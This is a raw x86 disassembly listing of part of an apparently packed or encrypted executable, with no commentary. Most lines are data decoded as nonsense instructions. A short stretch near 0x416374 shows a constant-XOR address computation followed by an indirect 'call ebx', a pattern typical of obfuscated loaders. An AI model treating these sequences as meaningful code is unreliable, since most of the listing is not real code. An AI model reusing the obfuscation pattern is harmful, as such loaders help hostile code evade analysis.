  415f42:	xlat   BYTE PTR ds:[ebx]
  415f43:	ret    
  415f44:	mov    BYTE PTR [eax-0x303aa640],dl
  415f4a:	fisubr DWORD PTR [edx]
  415f4c:	xchg   ebx,eax
  415f4d:	jp     0x415efb
  415f4f:	repz sub BYTE PTR [eax+0x27],0xf1
  415f54:	sbb    DWORD PTR [edx+0x79],ecx
  415f57:	pop    esp
  415f58:	or     DWORD PTR [esp+eax*4-0x571363da],0x11f8878
  415f63:	test   eax,0xa23d90a6
  415f68:	aad    0x2c
  415f6a:	sbb    ebp,edi
  415f6c:	xor    ebp,ebx
  415f6e:	arpl   WORD PTR [ebp+0x20],di
  415f71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f72:	pop    esi
  415f73:	out    dx,al
  415f74:	icebp  
  415f75:	fisubr DWORD PTR [eax]
  415f77:	sahf   
  415f78:	dec    ebx
  415f79:	dec    ebx
  415f7a:	sub    al,0x82
  415f7c:	jg     0x415f7c
  415f7e:	loop   0x415f0b
  415f80:	push   ss
  415f81:	push   esi
  415f82:	mov    bl,0xe9
  415f84:	sbb    eax,ebx
  415f86:	jns    0x416007
  415f88:	xchg   edx,eax
  415f89:	test   eax,0xccabe957
  415f8e:	mov    al,ds:0xfea33a67
  415f93:	push   0xc
  415f95:	mov    dl,0x26
  415f97:	mov    esi,0x4c5a4c12
  415f9c:	sbb    ebp,DWORD PTR [edi-0x1d41508a]
  415fa2:	aad    0x33
  415fa4:	(bad)  
  415fa5:	(bad)  
  415fa6:	and    eax,0x8500379
  415fab:	ds leave 
  415fad:	xchg   ebx,eax
  415fae:	pop    eax
  415faf:	pop    ebp
  415fb0:	out    dx,eax
  415fb1:	xchg   esi,eax
  415fb2:	sub    al,0xa0
  415fb4:	test   al,0xa8
  415fb6:	ins    DWORD PTR es:[edi],dx
  415fb7:	pop    ss
  415fb8:	dec    ebp
  415fb9:	and    BYTE PTR [ebx+0x4c],al
  415fbc:	cs jnp 0x415ff9
  415fbf:	mov    ds:0xe1a332a3,al
  415fc4:	mov    BYTE PTR [ebp*2-0x7a1b55ab],bl
  415fcb:	inc    ebx
  415fcc:	xchg   ecx,eax
  415fcd:	or     bh,ah
  415fcf:	xor    dl,BYTE PTR [esi+0x7805feb5]
  415fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fd6:	test   eax,0xecdea58a
  415fdb:	scas   al,BYTE PTR es:[edi]
  415fdc:	dec    esp
  415fdd:	int3   
  415fde:	push   ebx
  415fdf:	inc    edi
  415fe0:	cwde   
  415fe1:	xor    eax,0x43da6919
  415fe6:	ret    0xa95a
  415fe9:	cdq    
  415fea:	es inc ecx
  415fec:	jns    0x416063
  415fee:	mov    edi,0xd3e4db5b
  415ff3:	push   esp
  415ff4:	(bad)  
  415ff5:	push   edx
  415ff6:	aaa    
  415ff7:	mov    ah,0xdb
  415ff9:	shl    BYTE PTR [eax-0x5fcc0338],0x15
  416000:	sbb    DWORD PTR [eax-0x21],eax
  416003:	add    eax,0x3446ad27
  416008:	data16 sbb al,0x23
  41600b:	ins    BYTE PTR es:[edi],dx
  41600c:	mov    edi,0xfb4dfc35
  416011:	fadd   QWORD PTR [ecx-0x8aed08f]
  416017:	pop    ebx
  416018:	addr16 aad 0x54
  41601b:	mov    eax,ds:0xee6937cc
  416020:	jb     0x416033
  416022:	or     ah,BYTE PTR [esi+0x67]
  416025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416026:	frstor [ecx-0x1d]
  416029:	jp     0x41608d
  41602b:	cld    
  41602c:	mov    eax,ds:0x7b107b23
  416031:	cmp    DWORD PTR [ecx+edi*8-0x38301a9b],ebx
  416038:	stos   BYTE PTR es:[edi],al
  416039:	cmp    esi,DWORD PTR [edi+edi*8+0x1bb70ff7]
  416040:	pusha  
  416041:	rcl    dl,1
  416043:	(bad)  
  416044:	jae    0x415fd3
  416046:	sahf   
  416047:	mov    ebp,0xf95b6cc
  41604c:	pop    ebx
  41604d:	mov    al,0x57
  41604f:	pop    ss
  416050:	mov    dl,0x50
  416052:	mov    dh,0x1c
  416054:	pop    ds
  416055:	push   es
  416056:	sbb    DWORD PTR [edi+0x4d],esi
  416059:	xchg   esp,eax
  41605a:	xchg   DWORD PTR [edx],ebp
  41605c:	xchg   ebp,eax
  41605d:	mov    ebx,DWORD PTR [edi-0xa]
  416060:	js     0x416056
  416062:	ins    BYTE PTR es:[edi],dx
  416063:	xor    eax,0x8b6b56ff
  416068:	push   ebp
  416069:	or     BYTE PTR [ebx],dh
  41606b:	ror    DWORD PTR [ebp+0x729c1084],0x32
  416072:	add    BYTE PTR [ecx+0x458b0845],cl
  416078:	call   0x3355b608
  41607d:	rol    DWORD PTR [ebx],0xc6
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x4160c8
  41609a:	mov    al,BYTE PTR [esi]
  41609c:	cmp    dl,cl
  41609e:	pop    ss
  41609f:	jg     0x416111
  4160a1:	mov    ecx,0xd770707e
  4160a6:	retf   
  4160a7:	shl    BYTE PTR [eax+esi*2+0x52],1
  4160ab:	aam    0x26
  4160ad:	mov    bh,0x68
  4160af:	stos   DWORD PTR es:[edi],eax
  4160b0:	je     0x416126
  4160b2:	mov    ch,BYTE PTR [ebp+0x68c40e7c]
  4160b8:	sub    eax,0x9daddf96
  4160bd:	mov    ah,0x5c
  4160bf:	push   0xa3ad57ae
  4160c4:	fdivr  DWORD PTR [ebp+edi*8+0x2f]
  4160c8:	les    ebp,FWORD PTR [ebx]
  4160ca:	out    dx,al
  4160cb:	fbld   TBYTE PTR [edi+ebx*2]
  4160ce:	dec    eax
  4160cf:	pop    edx
  4160d0:	retf   0x3ae3
  4160d3:	inc    edi
  4160d4:	jo     0x416061
  4160d6:	movhps QWORD PTR [ecx],xmm7
  4160d9:	hlt    
  4160da:	pop    eax
  4160db:	loope  0x41606b
  4160dd:	out    0xf8,al
  4160df:	push   edi
  4160e0:	out    0x5e,eax
  4160e2:	and    al,0x0
  4160e4:	mov    DWORD PTR [ecx-0x6e],ebx
  4160e7:	(bad)  
  4160e8:	dec    ebx
  4160e9:	jns    0x41607b
  4160eb:	cdq    
  4160ec:	test   BYTE PTR [edi],bh
  4160ee:	sub    al,0xa2
  4160f0:	outs   dx,BYTE PTR ds:[esi]
  4160f1:	mov    DWORD PTR [ecx+0x5db0f741],ebp
  4160f7:	fist   DWORD PTR [ebp+0x43]
  4160fa:	retf   0xc177
  4160fd:	icebp  
  4160fe:	call   0x343c:0xe9018ddc
  416105:	fimul  DWORD PTR [ecx-0x60]
  416108:	xor    DWORD PTR [ecx+0x2f862808],ebp
  41610e:	(bad)  
  41610f:	jae    0x4160e5
  416111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416112:	xchg   edx,eax
  416113:	and    al,0xa4
  416115:	js     0x4160ec
  416117:	push   edi
  416118:	in     al,dx
  416119:	mov    ch,0x93
  41611b:	sub    ebx,DWORD PTR [edi+0xa218695]
  416121:	xchg   esp,eax
  416122:	rcl    ecx,0x81
  416125:	shl    DWORD PTR [ecx],cl
  416127:	sbb    bl,ch
  416129:	pop    edi
  41612a:	pusha  
  41612b:	add    esi,edi
  41612d:	cmp    bh,BYTE PTR [ebx+eax*2+0x5e]
  416131:	and    DWORD PTR ds:0x6a0fb0d6,ebp
  416137:	xchg   esp,eax
  416138:	sbb    DWORD PTR [edi+ebp*4+0x755dc16f],edx
  41613f:	leave  
  416140:	in     eax,dx
  416141:	call   0x4cf3:0x5891e30a
  416148:	sar    BYTE PTR [edx+0x6cf62295],0xaa
  41614f:	fistp  WORD PTR [ebp-0xa4104ec]
  416155:	pop    ebx
  416156:	jg     0x416167
  416158:	js     0x41612e
  41615a:	mov    al,ds:0xb890011b
  41615f:	(bad)  
  416160:	enter  0x4b59,0x38
  416164:	sub    DWORD PTR [ebp+0x3b],edx
  416167:	int3   
  416168:	mov    cl,0xbd
  41616a:	cmp    BYTE PTR [ebx-0x25],dl
  41616d:	(bad)  
  41616e:	jns    0x4161d4
  416170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416171:	out    0x98,eax
  416173:	mov    ch,dl
  416175:	and    bh,BYTE PTR ds:0x1ed076f6
  41617b:	enter  0x571,0xc0
  41617f:	sub    edi,DWORD PTR [esi+ebp*8]
  416182:	int3   
  416183:	push   ds
  416184:	(bad)  
  416185:	int3   
  416186:	test   BYTE PTR [esi],bl
  416188:	lods   al,BYTE PTR ds:[esi]
  416189:	xchg   ecx,eax
  41618a:	mov    ebx,0xfd82a8a5
  41618f:	in     eax,dx
  416190:	mov    BYTE PTR [edx-0x66a27c5f],0x38
  416197:	mov    bl,0x25
  416199:	and    al,0xcf
  41619b:	and    ecx,DWORD PTR ds:0xd90312f2
  4161a1:	or     esp,DWORD PTR [ebx]
  4161a3:	fidivr DWORD PTR [ecx+0x26]
  4161a6:	cli    
  4161a7:	push   eax
  4161a8:	aam    0xc8
  4161aa:	mov    ds:0x82e63edf,eax
  4161af:	out    dx,al
  4161b0:	int    0x5c
  4161b2:	cmp    BYTE PTR [edx],bl
  4161b4:	xchg   esi,eax
  4161b5:	cmp    BYTE PTR [ebp-0x53],dl
  4161b8:	cmp    DWORD PTR [ebx-0x57],0xffffffe2
  4161bc:	inc    eax
  4161bd:	jnp    0x41617e
  4161bf:	(bad)  
  4161c0:	in     eax,dx
  4161c1:	inc    ebx
  4161c2:	xor    eax,0xab5087a4
  4161c7:	je     0x416215
  4161c9:	add    DWORD PTR [ebx+0xa],esi
  4161cc:	popf   
  4161cd:	stc    
  4161ce:	test   al,0xc1
  4161d0:	pop    ss
  4161d1:	les    eax,FWORD PTR [ecx-0xce265ef]
  4161d7:	inc    ebx
  4161d8:	daa    
  4161d9:	jns    0x416257
  4161db:	ret    
  4161dc:	les    ebx,FWORD PTR [ebx-0x27]
  4161df:	dec    BYTE PTR [eax-0x15]
  4161e2:	into   
  4161e3:	pop    esp
  4161e4:	shr    bh,0x55
  4161e7:	mov    DWORD PTR [ebx+0x28],ecx
  4161ea:	dec    ecx
  4161eb:	push   es
  4161ec:	jne    0x416265
  4161ee:	mov    ecx,0xa9767dad
  4161f3:	mov    al,0x64
  4161f5:	xchg   esi,eax
  4161f6:	mov    cl,0x4c
  4161f8:	cmc    
  4161f9:	movntps XMMWORD PTR [edi],xmm4
  4161fc:	jnp    0x41620b
  4161fe:	xor    BYTE PTR [ecx+0x4],bl
  416201:	cmp    BYTE PTR [ebx-0x1eeca22b],cl
  416207:	mov    esi,0x726e9fef
  41620c:	xor    esi,0xffffffad
  41620f:	in     eax,dx
  416210:	js     0x41625f
  416212:	mov    ds:0xe21b5cbd,al
  416217:	mov    ecx,esi
  416219:	dec    ebx
  41621a:	xor    bl,BYTE PTR [ebx+0x4f32697f]
  416220:	jmp    0x8778:0xb0551a37
  416227:	adc    BYTE PTR [edx+esi*8-0x69],al
  41622b:	iret   
  41622c:	jge    0x416267
  41622e:	jnp    0x41627f
  416230:	sbb    eax,0x304964b1
  416235:	je     0x416221
  416237:	mov    DWORD PTR [esi],eax
  416239:	cmp    eax,0x1b9315e7
  41623e:	rcpps  xmm1,XMMWORD PTR [edi]
  416241:	test   BYTE PTR [edx-0x45],ch
  416244:	call   0x17a4:0x8bac4711
  41624b:	loope  0x41620b
  41624d:	xchg   esp,eax
  41624e:	and    DWORD PTR [esi],ecx
  416250:	daa    
  416251:	cs aas 
  416253:	push   DWORD PTR [esi]
  416255:	call   0x3b15:0xfd4344cd
  41625c:	mov    cl,0xae
  41625e:	retf   0x5f53
  416261:	test   BYTE PTR [edx],dh
  416263:	(bad)  
  416264:	pop    ss
  416265:	(bad)  
  416266:	xchg   ecx,eax
  416267:	xchg   DWORD PTR [ebp+0x5d2eaf91],esi
  41626d:	(bad)  
  41626e:	push   0xffffffc5
  416270:	loope  0x4162bc
  416272:	mov    ebp,0x859f894f
  416277:	test   al,0x90
  416279:	and    DWORD PTR [ebp-0x7e3272ea],ecx
  41627f:	inc    ebx
  416280:	jecxz  0x4162ac
  416282:	fs popf 
  416284:	in     al,0x9b
  416286:	sub    DWORD PTR [ecx-0x73cf0dcc],edx
  41628c:	in     eax,0x58
  41628e:	mov    ds:0xbe9422e1,al
  416293:	test   al,0x1a
  416295:	shl    DWORD PTR [edi-0x620fd2cd],1
  41629b:	daa    
  41629c:	or     edx,edi
  41629e:	pop    edi
  41629f:	cld    
  4162a0:	sub    BYTE PTR [ecx*4+0xfcb2874],al
  4162a7:	pop    ebx
  4162a8:	fisubr WORD PTR [edi+0x1de45aa3]
  4162ae:	aam    0x5c
  4162b0:	and    esi,DWORD PTR [eax+0x343dcb30]
  4162b6:	leave  
  4162b7:	add    ebp,DWORD PTR [esi-0x4f12521]
  4162bd:	pop    ss
  4162be:	out    0x7e,al
  4162c0:	arpl   cx,di
  4162c2:	imul   edx,edi,0xfffffff5
  4162c5:	or     ah,ch
  4162c7:	mov    edi,0x8abb97a5
  4162cc:	cmp    esp,esi
  4162ce:	aam    0xeb
  4162d0:	add    eax,0x36932d09
  4162d5:	fld    TBYTE PTR [edi+0x1f52640b]
  4162db:	loope  0x416346
  4162dd:	mov    ?,WORD PTR [ebx+ecx*4+0x18f45af7]
  4162e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162e5:	xchg   ebp,eax
  4162e6:	and    eax,edi
  4162e8:	mov    ch,0x86
  4162ea:	in     eax,dx
  4162eb:	cmc    
  4162ec:	and    eax,0x90ae7fbe
  4162f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162f2:	movlps QWORD PTR [eax],xmm2
  4162f5:	jb     0x4162ce
  4162f7:	lds    esi,FWORD PTR fs:[ecx]
  4162fa:	inc    esp
  4162fb:	mov    ds:0xbef1371c,eax
  416300:	test   eax,0xb3dc605e
  416305:	jne    0x4162ec
  416307:	jbe    0x416355
  416309:	jno    0x4162f0
  41630b:	mov    ecx,DWORD PTR [ecx+0x1f]
  41630e:	ds pop eax
  416310:	pop    es
  416311:	jb     0x41633b
  416313:	das    
  416314:	pushf  
  416315:	mov    ds:0xd3380a42,al
  41631a:	inc    eax
  41631b:	scas   al,BYTE PTR es:[edi]
  41631c:	out    0xbc,eax
  41631e:	hlt    
  41631f:	push   ss
  416320:	dec    esp
  416321:	lods   eax,DWORD PTR ds:[esi]
  416322:	repnz adc DWORD PTR [edx],esp
  416325:	test   eax,0xd96b6414
  41632a:	push   0x88e3935a
  41632f:	fwait
  416330:	and    al,0xc9
  416332:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  416334:	jno    0x4162f0
  416336:	(bad)  
  416337:	cmp    ch,BYTE PTR [esi+0x45dac82b]
  41633d:	aas    
  41633e:	ins    DWORD PTR es:[edi],dx
  41633f:	dec    ecx
  416340:	(bad)  
  416341:	sbb    al,BYTE PTR [ecx-0x4f]
  416344:	dec    esp
  416345:	out    0x16,eax
  416347:	popf   
  416348:	popf   
  416349:	or     eax,ebp
  41634b:	pusha  
  41634c:	dec    ecx
  41634d:	dec    edi
  41634e:	jge    0x4162fb
  416350:	int    0x29
  416352:	xchg   esp,eax
  416353:	mov    ebx,0xcf9a24ab
  416358:	inc    edi
  416359:	mov    cl,0x84
  41635c:	test   DWORD PTR [edx],eax
  41635e:	cli    
  41635f:	les    ebp,FWORD PTR [esi+esi*1]
  416362:	aaa    
  416363:	in     eax,0xf8
  416365:	mov    WORD PTR [esi+edi*8-0x35],ds
  416369:	addr16 lock retf 0x4d8b
  41636e:	or     BYTE PTR [ebp+0x729c0a8c],cl
  416374:	xor    al,BYTE PTR [eax]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x8106c841
  4163bf:	jnp    0x4163df
  4163c1:	adc    edx,DWORD PTR [edi+edi*2]
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x416426
  4163ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163cb:	imul   DWORD PTR [edi+0x18]
  4163ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163cf:	xchg   esi,eax
  4163d0:	mov    ds:0xfbfd1459,al
  4163d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163d6:	adc    ebx,DWORD PTR [eax-0x71]
  4163d9:	dec    ecx
  4163da:	pop    eax
  4163db:	add    eax,0x59f66bac
  4163e0:	sbb    dx,WORD PTR [ebp-0x2f]
  4163e4:	push   0x19
  4163e6:	ins    DWORD PTR es:[edi],dx
  4163e7:	out    0xb8,al
  4163e9:	dec    esi
  4163ea:	out    0x73,eax
  4163ec:	stos   BYTE PTR es:[edi],al
  4163ed:	hlt    
  4163ee:	dec    esi
  4163ef:	inc    eax
  4163f0:	out    0x8a,eax
  4163f2:	rol    BYTE PTR [ebx-0xe],0xd3
  4163f6:	jb     0x4163a0
  4163f8:	mov    al,ds:0xbb04362c
  4163fd:	iret   
  4163fe:	ins    DWORD PTR es:[edi],dx
  4163ff:	(bad)  
  416400:	mov    eax,0x8af8a7d0
  416405:	sbb    al,0x1d
  416407:	stos   DWORD PTR es:[edi],eax
  416408:	addr16 xchg edx,eax
  41640a:	or     edx,DWORD PTR ds:0xddae509f
  416410:	and    BYTE PTR [edx-0x60fa89bf],0xa1
  416417:	adc    BYTE PTR [ecx-0x2fb41862],0xab
  41641e:	jecxz  0x41647f
  416420:	inc    ebx
  416421:	scas   ax,WORD PTR es:[edi]
  416423:	int    0x2c
  416425:	mov    WORD PTR [ebx+ecx*8-0x1],es
  416429:	cld    
  41642a:	xchg   ecx,eax
  41642b:	retf   
  41642c:	je     0x41647f
  41642e:	push   ebx
  41642f:	pop    ebx
  416430:	inc    esi
  416431:	nop
  416432:	loope  0x416476
  416434:	lea    esi,[eax]
  416436:	jmp    0xe9ae:0xdac73e6b
  41643d:	jp     0x416468
  41643f:	gs loopne 0x416458
  416442:	adc    bh,BYTE PTR [ebp+0xdcf2585]
  416448:	jb     0x4164b9
  41644a:	push   ebx
  41644b:	in     al,dx
  41644c:	jge    0x4164af
  41644e:	fcomp  DWORD PTR [edx+0x8]
  416451:	imul   esi,DWORD PTR [edi+0x161ef6bc],0x98c02366
  41645b:	pop    ss
  41645c:	mov    ecx,0x97add49
  416461:	add    eax,0x8313ebb1
  416466:	and    eax,0x7bcb99c7
  41646b:	dec    ecx
  41646c:	repnz ss shl ecx,1
  416470:	pop    eax
  416471:	inc    ecx
  416472:	push   ebx
  416473:	pop    es
  416474:	xchg   ebx,eax
  416475:	shl    DWORD PTR [ecx],cl
  416477:	dec    ecx
  416478:	jge    0x41645d
  41647a:	fcomp  QWORD PTR [ebx-0x4f]
  41647d:	and    ebx,DWORD PTR [ebp+0x4f]
  416480:	rol    dh,1
  416482:	adc    ah,BYTE PTR [ecx+0x6c6c5267]
  416488:	mov    al,ds:0x9fd00496
  41648d:	adc    BYTE PTR [esi+edi*1],0x87
  416491:	jnp    0x4164c8
  416493:	or     edi,DWORD PTR ds:0x23191825
  416499:	stos   DWORD PTR es:[edi],eax
  41649a:	mov    bh,0x7
  41649c:	xchg   esp,eax
  41649d:	pop    esp
  41649e:	xor    BYTE PTR [eax-0x2f],0x23
  4164a2:	jns    0x4164c4
  4164a4:	push   ss
  4164a5:	xor    DWORD PTR [ecx],edx
  4164a7:	add    edx,DWORD PTR [ecx+0x4c0aef18]
  4164ad:	retf   0x2474
  4164b0:	mov    edi,0x2e0ded74
  4164b5:	cmp    bl,dl
  4164b7:	inc    esi
  4164b8:	or     ebp,edi
  4164ba:	lods   eax,DWORD PTR ds:[esi]
  4164bb:	(bad)  
  4164bc:	popf   
  4164bd:	hlt    
  4164be:	ds push ecx
  4164c0:	stos   DWORD PTR es:[edi],eax
  4164c1:	inc    ecx
  4164c2:	jnp    0x416448
  4164c4:	pusha  
  4164c5:	je     0x416450
  4164c7:	dec    esi
  4164c8:	pop    eax
  4164c9:	sbb    al,BYTE PTR [ebp-0x61f62d4b]
  4164cf:	mov    esp,0x8de0baba
  4164d4:	mov    cl,0x17
  4164d6:	test   al,0xb4
  4164d8:	mov    al,0x6d
  4164da:	fidivr WORD PTR [edi-0x14]
  4164dd:	in     al,0xd4
  4164df:	jp     0x41649a
  4164e1:	out    dx,al
  4164e2:	lods   eax,DWORD PTR ds:[esi]
  4164e3:	ret    0xeff6
  4164e6:	or     al,0xc4
  4164e8:	push   0x808388ad
  4164ed:	sub    BYTE PTR [ebx-0x2e],0xac
  4164f1:	xor    ebx,DWORD PTR [esi+0x23836e9e]
  4164f7:	inc    ecx
  4164f8:	stos   DWORD PTR es:[edi],eax
  4164f9:	cmp    BYTE PTR [ecx+ebx*1-0x2c],bl
  4164fd:	repnz lods eax,DWORD PTR ds:[esi]
  4164ff:	mov    esi,0xf7a6e5ef
  416504:	icebp  
  416505:	dec    eax
  416506:	mov    ebp,0xdff7715c
  41650b:	es popa 
  41650d:	sbb    BYTE PTR [ecx*4-0xfbe3fcc],dh
  416514:	and    ah,ch
  416516:	js     0x41653d
  416518:	dec    edi
  416519:	std    
  41651a:	add    edx,esp
  41651c:	pop    eax
  41651d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41651e:	fisub  WORD PTR [esi+ecx*8+0x52623e30]
  416525:	dec    edi
  416526:	cmp    BYTE PTR ds:[edx],dh
  416529:	xchg   edx,eax
  41652a:	retf   
  41652b:	enter  0xd6f7,0x63
  41652f:	cdq    
  416530:	lock xor cl,BYTE PTR [esi+0x6e8abdde]
  416537:	mov    ds:0x37b37418,eax
  41653c:	push   es
  41653d:	inc    ecx
  41653e:	sbb    al,0xbb
  416540:	std    
  416541:	in     al,dx
  416542:	dec    eax
  416543:	arpl   WORD PTR [esi],si
  416545:	jno    0x41653d
  416547:	ret    
  416548:	enter  0xd920,0x9c
  41654c:	dec    ebp
  41654d:	test   al,0x5d
  41654f:	ins    DWORD PTR es:[edi],dx
  416550:	daa    
  416551:	out    0x52,eax
  416553:	jecxz  0x4165c9
  416555:	push   ebp
  416556:	cmp    DWORD PTR [esi-0x60],ebp
  416559:	add    dh,BYTE PTR ds:0x6c340c71
  41655f:	add    eax,0xaa4a18a9
  416564:	adc    DWORD PTR [edi+ebx*2],ebp
  416567:	dec    ebp
  416568:	jmp    0x7aebce97
  41656d:	(bad)  
  41656e:	into   
  41656f:	arpl   WORD PTR [eax],ax
  416571:	jg     0x416588
  416573:	es jae 0x4165cf
  416576:	adc    al,0x4e
  416578:	xchg   BYTE PTR [esi-0x77bdef47],ch
  41657e:	fndisi(8087 only) 
  416580:	mov    ds:0x6e667d46,al
  416585:	xor    BYTE PTR [ecx-0x7d],bl
  416588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416589:	mov    dh,0xec
  41658b:	call   0x1e98:0x3264b63f
  416592:	stos   DWORD PTR es:[edi],eax
  416593:	retf   0x773c
  416596:	arpl   sp,cx
  416598:	mov    ebx,0xd2194a0b
  41659d:	repz add BYTE PTR [ebx+0x6fb8dd91],bl
  4165a4:	dec    edi
  4165a5:	icebp  
  4165a6:	mov    cl,0x63
  4165a8:	inc    ebx
  4165a9:	ja     0x4165c3
  4165ab:	cmp    BYTE PTR [edi+ebp*4-0x36d69e8f],ch
  4165b2:	gs addr16 sub ah,ch
  4165b6:	sub    bh,cl
  4165b8:	cli    
  4165b9:	dec    edi
  4165ba:	shl    eax,1
  4165bc:	std    
  4165bd:	or     DWORD PTR ds:0x1879748a,edi
  4165c3:	outs   dx,DWORD PTR ds:[esi]
  4165c4:	pop    esi
  4165c5:	sbb    edi,DWORD PTR [esp+esi*8+0x67]
  4165c9:	jae    0x41654f
  4165cb:	add    DWORD PTR [edx-0x15],0xfffffffd
  4165cf:	jne    0x4165b8
  4165d1:	pop    es
  4165d2:	dec    esp
  4165d3:	mov    bh,0xd8
  4165d5:	xchg   esp,eax
  4165d6:	lock mov ebx,0x6c875648
  4165dc:	call   0x8ea6:0xc1de866
  4165e3:	ja     0x4165b4
  4165e5:	stos   BYTE PTR es:[edi],al
  4165e6:	xor    dl,BYTE PTR [ecx+edi*2]
  4165e9:	sbb    ah,BYTE PTR [esi]
  4165eb:	jp     0x41663c
  4165ed:	enter  0x8706,0x73
  4165f1:	ds retf 0x4bc0
  4165f5:	inc    ebp
  4165f6:	ficom  WORD PTR [ebp-0x370f9917]
  4165fc:	(bad)  
  4165fd:	xor    DWORD PTR [eax],edx
  4165ff:	jl     0x4165d5
  416601:	ins    DWORD PTR es:[edi],dx
  416602:	jge    0x416589
  416604:	mov    dh,BYTE PTR [esi+0x6c0c1de4]
  41660a:	aas    
  41660b:	dec    edx
  41660c:	outs   dx,DWORD PTR ds:[esi]
  41660d:	sbb    DWORD PTR [edx-0x3a],esp
  416610:	shl    BYTE PTR [esi-0x42],1
  416613:	int3   
  416614:	mov    BYTE PTR [ebx],dl
  416616:	xor    BYTE PTR [edi+ecx*4],0x5d
  41661a:	jg     0x41667a
  41661c:	aas    
  41661d:	outs   dx,DWORD PTR ds:[esi]
  41661e:	out    dx,al
  41661f:	or     ch,bh
  416621:	xor    BYTE PTR [ebp+0x215e9f81],ah
  416627:	push   eax
  416628:	inc    eax
  416629:	or     al,0x83
  41662b:	inc    ebp
  41662c:	rcr    esp,0xec
  41662f:	cld    
  416630:	retf   
  416631:	das    
  416632:	mov    esi,0xdc4f718a
  416637:	dec    edi
  416638:	fdiv   st,st(1)
  41663a:	jmp    0x633c:0x45e6beac
  416641:	mov    bh,bh
  416643:	mov    edi,0x59890231
  416648:	enter  0x7896,0xea
  41664c:	push   ebx
  41664d:	loope  0x4166c3
  41664f:	inc    edi
  416650:	xor    cl,BYTE PTR [eax]
  416652:	jmp    0xe851:0xbbd2234b
  416659:	hlt    
  41665a:	mov    ebp,0x6448afba
  41665f:	sahf   
  416660:	or     DWORD PTR [edi-0x31a57d18],0x19
  416667:	les    esi,FWORD PTR [ebx+0x41]
  41666a:	pop    ebx
  41666b:	imul   edx,DWORD PTR [esi-0x48],0x4d48c04e
  416672:	or     BYTE PTR [esi],cl
  416674:	mov    dl,0x8d
  416676:	es retf 0x4908
  41667a:	jo     0x4166c5
  41667c:	xchg   esi,eax
  41667d:	push   eax
  41667e:	xchg   ebx,eax
  41667f:	mov    al,ds:0xefb89ea2
  416684:	mov    al,ds:0x939aba6b
  416689:	pop    es
  41668a:	retf   0x71ea
  41668d:	xchg   esi,eax
  41668e:	mov    ebx,0xa6a9264
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x416699
  4166ae:	(bad)  
  4166af:	jg     0x41664f
  4166b1:	pop    esp
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0xe570707e
  4166ba:	fisub  WORD PTR [edi+0x7d]
  4166bd:	xor    BYTE PTR [edi],bl
  4166bf:	or     BYTE PTR [ecx-0x52],dl
  4166c2:	sub    DWORD PTR [edx+0x3b],eax
  4166c5:	test   bh,bh
  4166c7:	aas    
  4166c8:	mov    esi,0x4b1c4f9a
  4166cd:	mov    ebp,0x938dce45
  4166d2:	and    ah,cl
  4166d4:	pop    esp
  4166d5:	xchg   edx,eax
  4166d6:	rcl    DWORD PTR [esi+0x3],cl
  4166d9:	lods   eax,DWORD PTR ds:[esi]
  4166da:	mov    edx,0x6d606c5c
  4166df:	add    BYTE PTR [ecx-0x54],ch
  4166e2:	jbe    0x41666b
  4166e4:	scas   eax,DWORD PTR es:[edi]
  4166e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166e6:	mov    ebp,0x836071b
  4166eb:	stos   BYTE PTR es:[edi],al
  4166ec:	or     al,0x6
  4166ee:	sub    eax,0x70cbefe2
  4166f3:	out    dx,eax
  4166f4:	mov    esp,0x98450176
  4166f9:	xor    eax,0xbb0f1510
  4166fe:	mov    edi,0x6c098c03
  416703:	sbb    DWORD PTR [eax+0x73378d4d],edx
  416709:	mov    bl,0x1
  41670b:	enter  0x81a1,0xa7
  41670f:	push   0x75aae0cb
  416714:	fs js  0x41675a
  416717:	cmp    dl,BYTE PTR [ebx]
  416719:	sbb    al,0x4f
  41671b:	mov    cl,0x70
  41671d:	aaa    
  41671e:	imul   edx,DWORD PTR [ebx+0xe889756],0x1bdd6acf
  416728:	adc    al,0xb9
